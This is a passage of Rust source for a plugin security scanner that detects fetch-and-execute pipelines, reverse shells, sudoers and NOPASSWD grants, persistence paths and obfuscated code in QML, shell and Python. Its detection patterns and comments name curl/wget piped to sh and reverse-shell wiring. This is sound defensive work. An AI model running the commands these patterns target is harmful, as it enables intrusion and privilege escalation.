                // `command` identifier on a Process-free line never
                // participates.
                if let Some((start, end)) = binding_value_span(line, search_from) {
                    evaluate_execution_span(
                        &line[start..end],
                        SinkKind::Process,
                        number,
                        &mut outcome,
                    );
                    for literal in span_sink_literals(&line[start..end]) {
                        record_sink_reference(
                            &literal,
                            SinkPosition::ProcessCommand,
                            number,
                            &mut outcome,
                        );
                    }
                }
            }
        }
        // Priority surfaces (lexical parity with the AST path).
        if find_word(line, "Polkit").is_some() {
            outcome.result_parts.push(parts(
                "oma.qml.polkit-agent-ui",
                number,
                "polkit-surface",
                Confidence::LexicalFallback,
            ));
        }
        if find_word(line, "PamContext").is_some() || line.contains("Services.Pam") {
            outcome.result_parts.push(parts(
                "oma.qml.pam-authentication",
                number,
                "pam-surface",
                Confidence::LexicalFallback,
            ));
        }
        if find_word(line, "WlSessionLock").is_some() {
            outcome.result_parts.push(parts(
                "oma.qml.session-lock",
                number,
                "session-lock-surface",
                Confidence::LexicalFallback,
            ));
        }
        if lower_contains(line, "clipboard") {
            outcome.capabilities.push(occurrence(
                Capability::ClipboardAccess,
                language,
                number,
                "clipboard-token",
            ));
        }
        // Hyprland* type prefixes don't satisfy word-end boundaries, so a
        // plain containment check applies; this family is capability-level.
        if line.contains("Hyprland") || line.contains("Wlr") || find_word(line, "hyprctl").is_some()
        {
            outcome.capabilities.push(occurrence(
                Capability::CompositorControl,
                language,
                number,
                "compositor-token",
            ));
        }
        // Dynamic-code needles must appear as live code, not inside quoted
        // string values. `createComponent`/`include` are matched through the
        // same Qt-global receiver verification the sink detection uses (H2
        // review): `backend.Qt.createComponent(...)` is a member named Qt,
        // not the Qt API, while `Qt . createComponent(...)` with whitespace
        // around the dot IS the Qt API and must not lose its dynamic-code
        // finding.
        let code = unquoted_text(line);
        if find_word(&code, "eval(").is_some()
            || find_word(&code, "createQmlObject(").is_some()
            || find_word(&code, "atob(").is_some()
            || !find_qt_global_calls(&code, "createComponent").is_empty()
            || !find_qt_global_calls(&code, "include").is_empty()
            || code.contains("new Function")
        {
            outcome.result_parts.push(parts(
                DYNAMIC_CODE_RULE,
                number,
                "dynamic-code-construction",
                Confidence::LexicalFallback,
            ));
            outcome.capabilities.push(occurrence(
                Capability::DynamicCodeExecution,
                language,
                number,
                line.trim(),
            ));
        }
        for literal in line_literals(line) {
            if let Some(length) = encoded_literal_length(literal) {
                outcome.result_parts.push(parts(
                    OBFUSCATION_RULE,
                    number,
                    format!("encoded-literal:{length}"),
                    Confidence::LexicalFallback,
                ));
                break;
            }
        }
        let persistence_path = (line.contains("autostart")
            || line.contains("systemd/user")
            || line.contains(".config/systemd"))
            && find_word(line, "FileView").is_some();
        if persistence_path {
            outcome.result_parts.push(parts(
                PERSISTENCE_RULE,
                number,
                "persistence-location",
                Confidence::LexicalFallback,
            ));
        }
        collect_lexical_sink_references(line, &code, number, &mut outcome);
        collect_quoted_references(line, number, &mut outcome.references);
    }

    outcome
}

fn lower_contains(haystack: &str, needle: &str) -> bool {
    haystack.to_ascii_lowercase().contains(needle)
}

/// Suspicious-provenance judgment over an extracted execution-argument span.
fn evaluate_execution_span(span: &str, kind: SinkKind, number: u32, outcome: &mut FileOutcome) {
    let rule_id = match kind {
        SinkKind::Process => PROCESS_RULE,
        SinkKind::DetachedExecution => DETACHED_RULE,
    };
    let joined = join_line_literals(span);
    // Egress attribution (H3 review): only the executable position
    // attributes egress. See argv_head_fetches.
    let head = if kind == SinkKind::Process {
        argv_head_fetches(&line_literals(span))
    } else {
        HeadEgress {
            fetches: false,
            exhausted: false,
        }
    };
    if head.fetches {
        outcome.capabilities.push(occurrence(
            Capability::NetworkAccess,
            Language::Qml,
            number,
            "process-argv-fetch-tool",
        ));
    }
    if head.exhausted {
        disclose_budget_limitation(outcome);
    }
    if let Some(shell_offset) = find_shell_interpreter(&joined) {
        outcome.result_parts.push(parts(
            rule_id,
            number,
            format!("shell-interpreter-command:{}", &joined[shell_offset..]),
            Confidence::LexicalFallback,
        ));
    } else if span.contains("responseText") || span.contains(".response") || span.contains(".text(")
    {
        outcome.result_parts.push(parts(
            rule_id,
            number,
            "network-response-executed",
            Confidence::LexicalFallback,
        ));
    }
}

/// Egress attribution from Process argv (H3 review): only the executable
/// position attributes egress — an argv[0] spelling a fetch tool, or the
/// `-c` script body an interpreter head executes (see
/// script_body_fetches). Arbitrary argument positions never do, so
/// `["notify-send", "curl failed"]` records no network access. A single
/// element is a whole-command string whose first word is the executable;
/// a computed (missing) head stays unattributed until the H4 dataflow
/// slice can resolve it. A `-c` body whose analysis exceeded the budget
/// reports exhaustion so the caller can disclose the shortfall.
struct HeadEgress {
    fetches: bool,
    exhausted: bool,
}

fn argv_head_fetches(elements: &[&str]) -> HeadEgress {
    let silent = HeadEgress {
        fetches: false,
        exhausted: false,
    };
    let Some(first) = elements.first() else {
        return silent;
    };
    let head = if elements.len() == 1 {
        first.split_whitespace().next().unwrap_or(first)
    } else {
        first
    };
    let basename = head.rsplit('/').next().unwrap_or(head);
    if matches!(basename, "curl" | "wget") {
        return HeadEgress {
            fetches: true,
            exhausted: false,
        };
    }
    if INTERPRETER_BASENAMES.contains(&basename)
        && let Some(script) = elements
            .iter()
            .position(|element| *element == "-c")
            .and_then(|position| elements.get(position + 1))
    {
        let (fetches, exhausted) = script_body_fetches(script);
        return HeadEgress { fetches, exhausted };
    }
    silent
}

/// The bracketed span starting at `open` ('(' or '['): to its matching
/// closer, honoring nesting and quoted strings.
fn balanced_bracket_span(text: &str, open: usize) -> Option<(usize, usize)> {
    let bytes = text.as_bytes();
    let opener = *bytes.get(open)?;
    let closer = match opener {
        b'(' => b')',
        b'[' => b']',
        b'{' => b'}',
        _ => return None,
    };
    let mut depth = 0usize;
    let mut index = open;
    let mut in_string: Option<u8> = None;
    while index < bytes.len() {
        let byte = bytes[index];
        match in_string {
            Some(quote) => {
                if byte == b'\\' {
                    index += 2;
                    continue;
                }
                if byte == quote {
                    in_string = None;
                }
            }
            None => {
                if byte == b'"' || byte == b'\'' {
                    in_string = Some(byte);
                } else if byte == opener {
                    depth += 1;
                } else if byte == closer {
                    depth -= 1;
                    if depth == 0 {
                        return Some((open + 1, index));
                    }
                }
            }
        }
        index += 1;
    }
    None
}

/// The value span after `property:` on one line, stopping at a closing
/// brace/comma at bracket depth zero.
fn binding_value_span(line: &str, property_word_end: usize) -> Option<(usize, usize)> {
    let colon = line[property_word_end..]
        .find(':')
        .map(|offset| property_word_end + offset)?;
    let mut start = colon + 1;
    while start < line.len() && line[start..].starts_with([' ', '\t']) {
        start += 1;
    }
    if start >= line.len() {
        return None;
    }
    let bytes = line.as_bytes();
    if matches!(bytes[start], b'[' | b'(' | b'{') {
        return balanced_bracket_span(line, start).map(|(_, end)| (start, end + 1));
    }
    // Scalar value runs to the first top-level terminator: brace, semicolon,
    // or a line comment. Commented text never participates in provenance.
    // The scan is quote-aware so a `//` INSIDE a quoted value (a URL scheme,
    // H2 review) never truncates the span.
    let mut end = start;
    let mut in_string: Option<u8> = None;
    while end < line.len() {
        let byte = bytes[end];
        match in_string {
            Some(quote) => {
                if byte == b'\\' {
                    end += 2;
                    continue;
                }
                if byte == quote {
                    in_string = None;
                }
            }
            None => {
                if byte == b'"' || byte == b'\'' {
                    in_string = Some(byte);
                } else if matches!(byte, b'}' | b';')
                    || (byte == b'/' && end + 1 < line.len() && bytes[end + 1] == b'/')
                {
                    break;
                }
            }
        }
        end += 1;
    }
    let trimmed = line[start..end.min(line.len())].trim_end();
    Some((start, start + trimmed.len()))
}

/// Comment syntax of the surrounding language. The two real line grammars
/// each get their own rule; shell comments are applied statefully by
/// `shell_logical_units` instead:
/// - QML/JS: `//` anywhere outside strings except in a scheme (`://`),
/// - Python: an unquoted `#` starts a comment at ANY position.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum CommentStyle {
    /// `// …` — QML/JS.
    DoubleSlash,
    /// `# …` anywhere outside strings — Python.
    PythonHash,
}

/// The executable prefix of a source line under the language's comment rule,
/// honoring quoted strings throughout.
fn strip_line_comment(line: &str, style: CommentStyle) -> &str {
    let bytes = line.as_bytes();
    let mut in_string: Option<u8> = None;
    let mut index = 0usize;
    while index < bytes.len() {
        let byte = bytes[index];
        match in_string {
            Some(quote) => {
                if byte == b'\\' {
                    index += 2;
                    continue;
                }
                if byte == quote {
                    in_string = None;
                }
            }
            None => {
                if byte == b'"' || byte == b'\'' {
                    in_string = Some(byte);
                    // Fall through so the cursor advances past the opening
                    // delimiter; otherwise the same byte immediately closes
                    // the string and markers inside it leak into detectors.
                }
                match style {
                    CommentStyle::DoubleSlash => {
                        if byte == b'/'
                            && index + 1 < bytes.len()
                            && bytes[index + 1] == b'/'
                            // Scheme guard: `https://host` is not a comment.
                            && (index == 0 || bytes[index - 1] != b':')
                        {
                            return &line[..index];
                        }
                    }
                    CommentStyle::PythonHash => {
                        if byte == b'#' {
                            return &line[..index];
                        }
                    }
                }
            }
        }
        index += 1;
    }
    line
}

/// Module name of an `import X.Y <version>` statement (keyword/version/as
/// excluded).
#[cfg(feature = "qml-parser")]
fn import_module_text(source: &str, node: tree_sitter::Node) -> String {
    let mut cursor = node.walk();
    let mut module = String::new();
    let mut children = Vec::new();
    for child in node.children(&mut cursor) {
        children.push(child);
    }
    // The grammar nests the module under nested_identifier when dotted;
    // otherwise a plain identifier. Version numbers are anonymous literals.
    for child in children {
        match child.kind() {
            "nested_identifier" | "identifier" => {
                module.push_str(&source[child.start_byte()..child.end_byte()]);
            }
            _ => {}
        }
    }
    module
}

/// Priority surfaces from imports. Near-zero-legitimacy third-party use of
/// polkit/PAM/session-lock APIs is itself the finding (surface doc); Hyprland/
/// Wayland imports record a compositor-control capability.
#[cfg(feature = "qml-parser")]
fn apply_import_surface(module: &str, line: u32, outcome: &mut FileOutcome) {
    if module.contains("Services.Polkit") {
        outcome.result_parts.push(parts(
            "oma.qml.polkit-agent-ui",
            line,
            "polkit-agent-import",
            Confidence::AstBacked,
        ));
    }
    if module.contains("PamContext") || module.contains("Services.Pam") {
        outcome.result_parts.push(parts(
            "oma.qml.pam-authentication",
            line,
            "pam-context-import",
            Confidence::AstBacked,
        ));
    }
    if module.contains("SessionLock") {
        outcome.result_parts.push(parts(
            "oma.qml.session-lock",
            line,
            "session-lock-import",
            Confidence::AstBacked,
        ));
    }
    if module.contains("Hyprland") || module.ends_with(".Wayland") || module.contains("Wlr") {
        outcome.capabilities.push(occurrence(
            Capability::CompositorControl,
            Language::Qml,
            line,
            &format!("import {module}"),
        ));
    }
}

/// Identifier/property tokens that mark priority or context surfaces.
#[cfg(feature = "qml-parser")]
fn apply_surface_token(
    source: &str,
    node: tree_sitter::Node,
    outcome: &mut FileOutcome,
    line: u32,
) {
    let _ = node;
    let text = &source[node.start_byte()..node.end_byte()];
    match text {
        "WlSessionLock" | "WlSessionLockSurface" => {
            outcome.result_parts.push(parts(
                "oma.qml.session-lock",
                line,
                format!("session-lock-type:{text}"),
                Confidence::AstBacked,
            ));
        }
        "PamContext" => {
            outcome.result_parts.push(parts(
                "oma.qml.pam-authentication",
                line,
                "pam-context-type",
                Confidence::AstBacked,
            ));
        }
        _ => {}
    }
    let lower = text.to_ascii_lowercase();
    if lower.contains("clipboard") {
        outcome.capabilities.push(occurrence(
            Capability::ClipboardAccess,
            Language::Qml,
            line,
            text,
        ));
    } else if text.starts_with("Hyprland") || text.starts_with("Wlr") || lower == "hyprctl" {
        outcome.capabilities.push(occurrence(
            Capability::CompositorControl,
            Language::Qml,
            line,
            text,
        ));
    }
}

/// Length of a base64-shaped literal worth surfacing as an indicator.
fn encoded_literal_length(content: &str) -> Option<usize> {
    let length = content.len();
    if length < 64 {
        return None;
    }
    let mut letters = false;
    let mut digits = false;
    for byte in content.bytes() {
        match byte {
            b'a'..=b'z' | b'A'..=b'Z' => letters = true,
            b'0'..=b'9' => digits = true,
            b'+' | b'/' | b'=' | b'_' | b'-' => {}
            _ => return None,
        }
    }
    (letters && digits).then_some(length)
}
fn find_word(haystack: &str, needle: &str) -> Option<usize> {
    let bytes = haystack.as_bytes();
    let mut start = 0usize;
    while let Some(position) = haystack[start..].find(needle) {
        let absolute = start + position;
        let before_ok = absolute == 0 || !bytes[absolute - 1].is_ascii_alphanumeric();
        let after = absolute + needle.len();
        // Needles ending in punctuation (`eval(`) are followed by identifier
        // characters by design; only word-tailed needles require a word end.
        let requires_word_end = needle
            .chars()
            .last()
            .is_some_and(|character| character.is_ascii_alphanumeric());
        let after_ok =
            !requires_word_end || after >= bytes.len() || !bytes[after].is_ascii_alphanumeric();
        if before_ok && after_ok {
            return Some(absolute);
        }
        start = absolute + needle.len().max(1);
    }
    None
}

/// All quoted literals on one line joined with single spaces, so argv-style
/// sources like `"sh", "-c", "cmd"` reconstruct into scannable text.
fn join_line_literals(line: &str) -> String {
    line_literals(line).join(" ")
}

/// Quoted string literals that look like paths become reference candidates.
fn collect_quoted_references(line: &str, number: u32, references: &mut Vec<ReferenceCandidate>) {
    for literal in line_literals(line) {
        // Decode escapes so context candidates match runtime spelling.
        let decoded = decode_js_escapes(literal);
        if is_path_shaped(&decoded) {
            references.push(ReferenceCandidate {
                line: number,
                value: decoded,
                sink: None,
            });
        }
    }
}

/// Runtime value of the quoted literals inside one span, escapes decoded
/// once at extraction (H2 review).
fn span_sink_literals(span: &str) -> Vec<String> {
    line_literals(span)
        .into_iter()
        .map(decode_js_escapes)
        .collect()
}

/// Sink positions on one lexical line (H2). The AST path marks reference
/// candidates precisely at binding/call nodes; the lexical fallback marks
/// the quoted literals of the binding value or call-argument span — never
/// every literal on the line, so an unrelated literal sharing the line
/// cannot inherit the sink (H2 review). Multi-line constructs degrade to
/// context, a documented lexical limitation — no match never implies clean
/// behavior.
fn collect_lexical_sink_references(line: &str, code: &str, number: u32, outcome: &mut FileOutcome) {
    // Import statements: the first quoted literal is the module specifier.
    if code.split_whitespace().next() == Some("import") {
        if let Some(specifier) = line_literals(line).into_iter().next() {
            let decoded = decode_js_escapes(specifier);
            apply_directory_import(&decoded, number, outcome);
        }
        return;
    }
    // Qt load-sink calls: only the FIRST argument (the URL) of a call whose
    // receiver is the Qt GLOBAL. `backend.Qt.createComponent(...)` (a member
    // named Qt) is not the Qt API and must not match; `Qt . createComponent(`
    // with whitespace around the dot IS the same call and must match.
    for (method, sink) in [
        ("createComponent", SinkPosition::CreateComponent),
        ("include", SinkPosition::Include),
    ] {
        for open_paren in find_qt_global_calls(code, method) {
            if let Some((start, end)) = first_argument_span(line, open_paren) {
                for literal in span_sink_literals(&line[start..end]) {
                    record_sink_reference(&literal, sink, number, outcome);
                }
            }
        }
    }
    // Binding sinks: only the value span after the binding word.
    mark_binding_literals(
        line,
        code,
        "Loader",
        "source",
        SinkPosition::LoaderSource,
        number,
        outcome,
    );
    mark_binding_literals(
        line,
        code,
        "FileView",
        "path",
        SinkPosition::FileViewPath,
        number,
        outcome,
    );
}

/// Mark the quoted literals of each `<binding_word>: <value>` binding value
/// span that lies INSIDE a `<object_word> { … }` object's brace span, at
/// brace depth zero of that object's initializer.
///
/// The binding must be scoped to the matching object's braces, not merely
/// share a line with the object word: `Loader {} Image { source: "…" }` must
/// not treat `Image.source` as `Loader.source`. Nested child objects must
/// not inherit the outer sink either — `Loader { Image { source: "…" } }`
/// carries the nested type's own semantics, so only depth-zero bindings
/// participate (H2 review). When the object's braces do not close on the
/// same line (a multi-line object), the span is unresolved and the construct
/// degrades to context — a documented lexical limitation.
fn mark_binding_literals(
    line: &str,
    code: &str,
    object_word: &str,
    binding_word: &str,
    sink: SinkPosition,
    number: u32,
    outcome: &mut FileOutcome,
) {
    let mut search_from = 0usize;
    while let Some(relative) = find_word(&code[search_from..], object_word) {
        let word_end = search_from + relative + object_word.len();
        search_from = word_end;
        // The object declaration is `<object_word> {`; only whitespace may sit
        // between the word and its opening brace.
        let Some(brace_open) = object_brace_open(code, word_end) else {
            continue;
        };
        let Some((body_start, body_end)) = balanced_bracket_span(line, brace_open) else {
            continue; // multi-line object: degrade to context
        };
        let body_end = body_end.min(code.len());
        if body_start > body_end {
            continue;
        }
        // Only the depth-zero segments of the object body participate:
        // segments inside a nested `{ … }` belong to a child object with its
        // own type. Slicing at brace bytes is UTF-8 safe (braces are ASCII
        // and cannot occur inside a multi-byte character).
        let body = &code[body_start..body_end];
        let mut segments: Vec<(usize, &str)> = Vec::new();
        let mut depth = 0usize;
        let mut segment_start = 0usize;
        for (offset, byte) in body.bytes().enumerate() {
            match byte {
                b'{' => {
                    depth += 1;
                    if depth == 1 {
                        segments.push((segment_start, &body[segment_start..offset]));
                    }
                }
                b'}' => {
                    depth -= 1;
                    if depth == 0 {
                        segment_start = offset + 1;
                    }
                }
                _ => {}
            }
        }
        if depth == 0 {
            segments.push((segment_start, &body[segment_start..]));
        }
        for (segment_offset, segment) in segments {
            let mut inner_from = 0usize;
            while let Some(rel) = find_word(&segment[inner_from..], binding_word) {
                let match_start = inner_from + rel;
                inner_from = match_start + binding_word.len();
                // Map the segment offset back to the line; `body` starts at
                // `body_start` and `code` is a prefix of `line`, so offsets
                // align.
                let property_word_end = body_start + segment_offset + inner_from;
                if let Some((start, end)) = binding_value_span(line, property_word_end) {
                    for literal in span_sink_literals(&line[start..end]) {
                        record_sink_reference(&literal, sink, number, outcome);
                    }
                }
            }
        }
    }
}

/// Byte index of the `{` that opens a `<object_word> {` object declaration,
/// i.e. the first non-whitespace byte after the object word must be `{`.
fn object_brace_open(code: &str, after_word: usize) -> Option<usize> {
    let bytes = code.as_bytes();
    let index = skip_ascii_ws(bytes, after_word);
    (bytes.get(index) == Some(&b'{')).then_some(index)
}

/// Advance past ASCII spaces and tabs.
fn skip_ascii_ws(bytes: &[u8], mut index: usize) -> usize {
    while index < bytes.len() && matches!(bytes[index], b' ' | b'\t') {
        index += 1;
    }
    index
}

/// Byte indices of the `(` opening each `Qt.<method>(` call whose receiver is
/// the Qt GLOBAL. Tolerates whitespace around the `.` and before the `(`, and
/// rejects a `Qt` that is itself a member/identifier part (e.g.
/// `backend.Qt.<method>`, `myQt.<method>`).
fn find_qt_global_calls(code: &str, method: &str) -> Vec<usize> {
    let bytes = code.as_bytes();
    let mut result = Vec::new();
    let mut from = 0usize;
    while let Some(relative) = find_word(&code[from..], "Qt") {
        let qt_start = from + relative;
        let qt_end = qt_start + 2;
        from = qt_end;
        // Receiver must be the Qt global, not a member or a longer identifier.
        // `find_word` already excludes an alphanumeric predecessor; also reject
        // a member-access dot and identifier-continuation bytes.
        if qt_start > 0 && matches!(bytes[qt_start - 1], b'.' | b'_' | b'$') {
            continue;
        }
        let mut index = skip_ascii_ws(bytes, qt_end);
        if bytes.get(index) != Some(&b'.') {
            continue;
        }
        index = skip_ascii_ws(bytes, index + 1);
        if !code[index..].starts_with(method) {
            continue;
        }
        let method_end = index + method.len();
        if bytes
            .get(method_end)
            .is_some_and(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'$'))
        {
            continue; // method name is a prefix of a longer identifier
        }
        let paren = skip_ascii_ws(bytes, method_end);
        if bytes.get(paren) != Some(&b'(') {
            continue;
        }
        result.push(paren);
        from = paren + 1;
    }
    result
}

/// The span of the FIRST argument inside a `(` at `open_paren` — from just
/// after the paren to the first top-level comma or the matching close paren.
/// Only the first argument of a load sink is the URL (H2 review).
fn first_argument_span(line: &str, open_paren: usize) -> Option<(usize, usize)> {
    let (inner_start, close) = balanced_bracket_span(line, open_paren)?;
    let bytes = line.as_bytes();
    let mut index = inner_start;
    let mut depth = 0usize;
    let mut in_string: Option<u8> = None;
    while index < close {
        let byte = bytes[index];
        match in_string {
            Some(quote) => {
                if byte == b'\\' {
                    index += 2;
                    continue;
                }
                if byte == quote {
                    in_string = None;
                }
            }
            None => match byte {
                b'"' | b'\'' => in_string = Some(byte),
                b'(' | b'[' | b'{' => depth += 1,
                b')' | b']' | b'}' => depth = depth.saturating_sub(1),
                b',' if depth == 0 => return Some((inner_start, index)),
                _ => {}
            },
        }
        index += 1;
    }
    Some((inner_start, close))
}

fn line_literals(line: &str) -> Vec<&str> {
    let bytes = line.as_bytes();
    let mut literals = Vec::new();
    let mut index = 0usize;
    while index < bytes.len() {
        let quote = bytes[index];
        if quote != b'"' && quote != b'\'' {
            index += 1;
            continue;
        }
        match line[index + 1..].find(quote as char) {
            Some(length) => {
                literals.push(&line[index + 1..index + 1 + length]);
                index += length + 2;
            }
            None => break,
        }
    }
    literals
}

/// The line with quoted-literal contents blanked so detector needles inside
/// string values never satisfy them. Quote characters become spaces to keep
/// offsets and word boundaries stable.
fn unquoted_text(line: &str) -> String {
    let bytes = line.as_bytes();
    let mut blanked = bytes.to_vec();
    let mut index = 0usize;
    while index < bytes.len() {
        let quote = bytes[index];
        if quote != b'"' && quote != b'\'' {
            index += 1;
            continue;
        }
        blanked[index] = b' ';
        match line[index + 1..].find(quote as char) {
            Some(length) => {
                for slot in &mut blanked[index + 1..index + 1 + length] {
                    *slot = b' ';
                }
                blanked[index + 1 + length] = b' ';
                index += length + 2;
            }
            None => break,
        }
    }
    String::from_utf8_lossy(&blanked).into_owned()
}

/// One detector observation before path anchoring.
struct ResultParts {
    rule_id: &'static str,
    line: Option<u32>,
    semantic_value: String,
    confidence: Confidence,
}

// ---------------------------------------------------------------------------
// Public per-language entry points.
// ---------------------------------------------------------------------------

fn analyze_javascript_source(source: &str) -> FileOutcome {
    lexical_scan(source, Language::JavaScript)
}

/// Minimal high-signal lexical rules for bundled shell/Python payloads.
/// Coverage is always labelled `partial`; no match never implies clean.
fn analyze_script_source(source: &str, kind: PayloadKind) -> FileOutcome {
    let mut outcome = FileOutcome {
        result_parts: Vec::new(),
        capabilities: Vec::new(),
        references: Vec::new(),
        parse_degraded: false,
        confidence: Confidence::LexicalFallback,
        limitations: Vec::new(),
    };
    let language = match kind {
        PayloadKind::Python => Language::Python,
        _ => Language::Shell,
    };
    let (download_rule, privilege_rule) = match kind {
        PayloadKind::Python => (PYTHON_DOWNLOAD_EXECUTE_RULE, PYTHON_PRIVILEGE_RULE),
        _ => (SCRIPT_DOWNLOAD_EXECUTE_RULE, SCRIPT_PRIVILEGE_RULE),
    };
    // Set when the recursion budget for untrusted shell text runs out on any
    // line: the analysis degrades and discloses the shortfall.
    let mut budget_exhausted = false;

    // Shell commands assemble into LOGICAL units across escaped newlines,
    // open pipelines, quotes, and groups (H3 review): `curl URL \` followed
    // by `| sh`, and the grammar continuation `curl URL |` followed by
    // `sh`, are one pipeline, not two fragments. Python keeps its
    // per-line scan; the classic one-liner chains its statements with `;`.
    let units: Vec<(u32, String)> = match kind {
        PayloadKind::Python => source
            .lines()
            .enumerate()
            .map(|(index, raw_line)| {
                (
                    index as u32 + 1,
                    strip_line_comment(raw_line, CommentStyle::PythonHash).to_owned(),
                )
            })
            .filter(|(_, line)| !line.is_empty())
            .collect(),
        _ => shell_logical_units(source),
    };

    for (number, line) in units {
        let line = line.as_str();

        // Download-and-execute (Python) and reverse-shell wiring are
        // line-level on purpose: the classic Python one-liner chains its
        // statements with `;`, so socket creation, connect, and descriptor
        // handoff legally live in separate statements of one line. The
        // shell consumption families below are statement-scoped instead.
        let code = unquoted_text(line);
        // Command-position families run on a real shell tokenisation so a
        // token's runtime value (`c"ur"l` → `curl`, escapes honoured) is kept
        // separate from its source syntax: a quoted executable heads its
        // command while quoted prose (`echo 'curl …'`) stays an operand, and
        // a quoted or escaped separator never splits a statement.
        let tokens = tokenize(line);
        let python_fetch_to_exec = matches!(kind, PayloadKind::Python)
            && (code.contains("urlopen")
                || code.contains("requests.get")
                || code.contains("urllib"))
            && (code.contains("os.system")
                || code.contains("subprocess")
                || code.contains("exec(")
                || code.contains("eval("));
        if python_fetch_to_exec {
            outcome.result_parts.push(parts(
                download_rule,
                number,
                "download-execute",
                Confidence::LexicalFallback,
            ));
        }

        // Egress attribution (H3): a fetch tool in command position is
        // network access from the plugin regardless of what happens to the
        // response — the same executable-position contract as QML argv
        // (`echo curl …` records nothing; see script_body_fetches).
        // Quoted literals stay invisible — a logged string mentioning curl
        // is not egress — while a fetch inside a live command substitution
        // (`payload="$(curl …)"`) is. The budget bounds the substitution and
        // group recursion over untrusted text; each traversal of the line
        // (egress here, consumption families below) owns its own, so nested
        // levels charge depth once per walk.
        let mut budget = ShellBudget::new();
        if tokens_fetch_egress(&tokens, &mut budget) {
            outcome.capabilities.push(occurrence(
                Capability::NetworkAccess,
                language,
                number,
                line.trim(),
            ));
        }
        if budget.exhausted() {
            budget_exhausted = true;
        }

        // Privilege escalation: an actual passwordless grant or a sudoers
        // WRITE. Read-only inspection (`grep NOPASSWD`, `cat`) and bare
        // sudo/pkexec invocation stay capability-level, matching the rule
        // summary's meaning. Both grant predicates require a real write
        // context — a sudoers mention alone is not a grant.
        let write_indicator = line.contains(">")
            || line.contains(">>")
            || line.contains("tee ")
            || line.contains("visudo")
            || line.contains("sed -i")
            || line.contains("chattr")
            || line.contains(".write(");
        // Read-only inspection of sudoers policy is not a grant.
        let first_word = line
            .split_whitespace()
            .next()
            .unwrap_or("")
            .rsplit('/')
            .next()
            .unwrap_or("");
        let readonly_inspection = matches!(
            first_word,
            "grep" | "cat" | "less" | "head" | "tail" | "stat" | "journalctl"
        );
        let grant_write_context = write_indicator && !readonly_inspection;
        let sudoers_write = line.contains("sudoers") && grant_write_context;
        let nopasswd_grant = line.contains("NOPASSWD") && grant_write_context;
        if nopasswd_grant || sudoers_write {
            outcome.result_parts.push(parts(
                privilege_rule,
                number,
                if nopasswd_grant {
                    "passwordless-root"
                } else {
                    "sudoers-write"
                },
                Confidence::LexicalFallback,
            ));
        }
        if ["sudo ", "pkexec ", "doas "]
            .iter()
            .any(|token| line.contains(token))
        {
            outcome.capabilities.push(occurrence(
                Capability::ProcessExecution,
                language,
                number,
                line.trim(),
            ));
        }
        if find_word(line, "systemctl").is_some()
            || find_word(line, "systemd-run").is_some()
            || find_word(line, "rc-service").is_some()
        {
            outcome.capabilities.push(occurrence(
                Capability::PersistenceScheduling,
                language,
                number,
                line.trim(),
            ));
        }
        if find_word(line, "pacman").is_some()
            || find_word(line, "paru").is_some()
            || find_word(line, "yay").is_some()
            || find_word(line, "apt-get").is_some()
            || find_word(line, "dnf ").is_some()
        {
            outcome.capabilities.push(occurrence(
                Capability::ProcessExecution,
                language,
                number,
                line.trim(),
            ));
        }

        // Reverse shell (H3, Python): a connected socket whose descriptor
        // reaches a process. Socket and dup2 words are independent — the
        // wiring must be explicit (see python_reverse_shell); multi-line
        // wiring is the H4 dataflow slice.
        if matches!(kind, PayloadKind::Python) {
            if python_reverse_shell(&code) {
                outcome.result_parts.push(parts(
                    PYTHON_REVERSE_SHELL_RULE,
                    number,
                    "reverse-shell",
                    Confidence::LexicalFallback,
                ));
            }
        } else {
            // Shell consumption families are statement- AND command-scoped
            // (H3 review): a fetcher, decoder, or chmod binds only to
            // consumption, targets, and paths inside its OWN statement and
            // in its OWN command position, so `eval "$(date)"; curl …`,
            // `echo chmod 777 /tmp/not-executed`, and `echo base64 -d | sh`
            // stay silent. Compound groups run their interiors as their own
            // statement list and as pipeline producers/consumers, so the
            // families recurse into them too.
            let mut found = Vec::new();
            let mut budget = ShellBudget::new();
            shell_consumption_findings(&tokens, number, download_rule, &mut found, &mut budget);
            if budget.exhausted() {
                budget_exhausted = true;
            }
            outcome.result_parts.extend(found);
        }
    }

    if budget_exhausted {
        disclose_budget_limitation(&mut outcome);
    }

    outcome
}

/// Whether the assembled text ends with an open pipeline or list operator —
/// the grammar demands the next line (`curl URL |`, `fetch &&`).
fn trailing_pipeline_operator(text: &str) -> bool {
    matches!(
        tokenize(text).last().and_then(ShellToken::operator),
        Some("|" | "|&" | "&&" | "||")
    )
}

/// Shell source assembled into LOGICAL command units: a unit continues
/// across escaped newlines (backslash-newline removed, no byte inserted),
/// trailing `|`/`|&`/`&&`/`||` operators, and open quotes, backticks, or
/// `(`/`{` groups, so a pipeline split over physical lines tokenizes whole
/// (`curl URL \` + `| sh`, `curl URL |` + `sh`). Comments are applied
/// statefully along the way — a `#` at a word boundary drops the rest of
/// its line, and a backslash-newline inside a comment never continues.
/// Each unit keeps its STARTING line number for findings.
fn shell_logical_units(source: &str) -> Vec<(u32, String)> {
    let source = shell_source_without_heredoc_payloads(source);
    let mut units: Vec<(u32, String)> = Vec::new();
    let mut text = String::new();
    let mut start_line = 1u32;
    let mut in_single = false;
    let mut in_double = false;
    let mut in_backtick = false;
    let mut open = false;
    for (index, raw_line) in source.lines().enumerate() {
        if !open {
            start_line = index as u32 + 1;
        }
        let mut escaped_newline = false;
        let mut boundary = true; // a line start is a word boundary for `#`
        let mut characters = raw_line.chars().peekable();
        while let Some(character) = characters.next() {
            if in_single {
                if character == '\'' {
                    in_single = false;
                }
                text.push(character);
                boundary = false;
                continue;
            }
            if in_backtick {
                if character == '`' {
                    in_backtick = false;
                }
                text.push(character);
                boundary = false;
                continue;
            }
            if in_double {
                if character == '\\' {
                    match characters.next() {
                        // A backslash-newline continues even inside quotes.
                        None => escaped_newline = true,
                        Some(next) => {
                            text.push(character);
                            text.push(next);
                        }
                    }
                } else if character == '"' {
                    in_double = false;
                    text.push(character);
                } else {
                    text.push(character);
                }
                boundary = false;
                continue;
            }
            if character == '\\' {
                match characters.next() {
                    None => escaped_newline = true,
                    Some(next) => {
                        text.push(character);
                        text.push(next);
                    }
                }
                boundary = false;
                continue;
            }
            // A `#` at a word boundary comments out the rest of the line —
            // including any trailing backslash continuation.
            if character == '#' && boundary {
                break;
            }
            text.push(character);
            boundary = matches!(character, ' ' | '\t' | ';' | '&' | '|' | '(');
            match character {
                '\'' => in_single = true,
                '"' => in_double = true,
                '`' => in_backtick = true,
                _ => {}
            }
        }
        if escaped_newline {
